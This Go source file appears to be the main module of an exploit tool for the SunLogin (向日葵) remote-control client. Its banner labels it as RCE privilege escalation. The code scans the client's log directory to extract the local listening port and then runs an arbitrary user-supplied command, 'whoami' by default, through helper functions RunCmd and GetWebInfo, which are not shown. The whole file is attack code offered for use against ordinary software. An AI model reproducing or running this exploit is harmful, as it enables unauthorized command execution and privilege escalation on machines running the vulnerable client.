package main

import (
	// "exec/exec"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"sort"
	"strings"
)

const (
	// path = "C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\log"

	path = "C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\log"

	localhost = "127.0.0.1"
)

func listAll(path string, curHier int) string {
	readerInfos, err := ioutil.ReadDir(path)
	if err != nil {
		fmt.Println(err)
		return ""
	}
	// var onename string

	readerInfos1 := sortByTime(readerInfos)

	var num int = 1
	var onename string
	for _, info := range readerInfos1 {

		if num >= 1 {
			num += 1
			onename = info.Name()
			break
		}
		// fmt.Println(onename)
		return onename

	}
	return onename
}

//获取到路径下的文件按照最新时间排序
func sortByTime(pl []os.FileInfo) []os.FileInfo {
	sort.Slice(pl, func(i, j int) bool {
		flag := false
		if pl[i].ModTime().After(pl[j].ModTime()) {
			flag = true
		} else if pl[i].ModTime().Equal(pl[j].ModTime()) {
			if pl[i].Name() < pl[j].Name() {
				flag = true
			}
		}
		return flag
	})
	return pl
}

func getport(f1 string, f2 string) string {

	url := f2 + "\\" + f1 //文件路

	b, err := ioutil.ReadFile(url)
	if err != nil {
		fmt.Print(err)
	}
	str := string(b)
	// fmt.Println(str)
	//正则匹配
	reg1 := regexp.MustCompile(`\bstart listen OK\S*\,`)
	reg2 := regexp.MustCompile(`\d{5}`)
	if reg1 == nil {
		fmt.Println("regexp err")
		return ""
	}

	result1 := reg1.FindAllStringSubmatch(str, -1)
	if result1 == nil {
		fmt.Println("regexp err")
		return ""
	}

	result2 := reg2.FindAllStringSubmatch(result1[0][0], -1)
	if result2 == nil {
		fmt.Println("regexp err")
		return ""
	}
	port := result2[0][0]

	return port
}
func init() {
	eg := `
	
----------------------------------------------

向日葵Rce 权限提升

----------------------------------------------
日志常用路径：
C:\Program Files\Oray\SunLogin\SunloginClient\log
C:\ProgramData\Oray\SunloginClient\log
C:\Program Files (x86)\Oray\SunLogin\SunloginClient\log
----------------------------------------------
`
	fmt.Println(eg)

}

func main() {
	var f string
	var cmdstr string
	flag.StringVar(&f, "f", "C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\log", "logfile")
	flag.StringVar(&cmdstr, "c", "whoami", "exec ")
	flag.Parse()
	//获取端口号
	//
	port := getport(listAll(f, 1), f)
	if GetWebInfo(port) == true {
		if port != "" && f != "" && cmdstr != "" {
			str := RunCmd(cmdstr, port)
			if str != "" {
				fmt.Println("[Info] 命令执行成功:\n", str)
			} else if strings.Contains(str, "Verification") {
				fmt.Println("[Info] 命令执行失败,可能不存在rce.")
			} else {
				fmt.Println("[Info] 命令执行完毕,但是没有回显.")
			}
		}

	} else if GetWebInfo(port) != true {
		fmt.Println("获取端口失败")
	}

}
